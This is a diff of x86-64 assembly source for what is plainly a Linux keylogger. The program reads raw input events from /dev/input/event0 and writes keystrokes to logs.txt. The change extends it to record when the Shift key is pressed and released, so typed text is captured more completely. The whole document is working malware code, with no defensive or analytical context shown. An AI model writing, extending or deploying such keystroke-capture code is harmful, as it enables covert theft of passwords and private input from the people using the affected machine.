@@ -184,8 +184,11 @@ keys:
 file: .string "/dev/input/event0"
 logs: .string "logs.txt"
 backspacePressed: .string "-Backspace key-"
-.section .data
+shiftKey: .string "-Shift key "
+shiftPressed: .string "was pressed-"
+shiftReleased: .string "was released-"
 
+.section .data
     buffer: .skip 256, 0
 
 .section .text
@@ -229,17 +232,25 @@ main:
         cmpw $1, (%rcx)
         jne mainLoop
 
-        # Check if the key was pressed or released
-        movq %rbx, %rdx
-        addq $20, %rdx
-        cmpl $1, (%rdx)
-        jne mainLoop
-
         # get the right keyboard key
         movq %rbx, %rsi
         addq $18, %rsi
         movzbq (%rsi), %rsi
         addq $keys, %rsi
+
+        # save the input_event.value in r8
+        movq %rbx, %r8
+        addq $20, %r8
+
+        # Check if the shift Key was pressed
+        cmpb $0xf, (%rsi)
+        je ShiftKey
+
+        # Check if the key was pressed or released
+
+        cmpl $0, (%r8)
+        je mainLoop
+
 
         cmpb $0x8, (%rsi)
         je BackspaceKey
@@ -259,6 +270,33 @@ main:
         movq $15, %rdx
         syscall
         jmp mainLoop
+    
+    ShiftKey:
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $shiftKey, %rsi
+        movq $11, %rdx
+        syscall
+
+        cmpl $1, (%r8)
+        je ShiftPressed
+        cmpl $0, (%r8)
+        je ShiftReleased
+
+        ShiftPressed:
+            movq $1, %rax
+            movq %r14, %rdi
+            movq $shiftPressed, %rsi
+            movq $12, %rdx
+            syscall
+            jmp mainLoop
+        ShiftReleased:
+            movq $1, %rax
+            movq %r14, %rdi
+            movq $shiftReleased, %rsi
+            movq $13, %rdx
+            syscall
+            jmp mainLoop
 
     popq %r14
     popq %r15
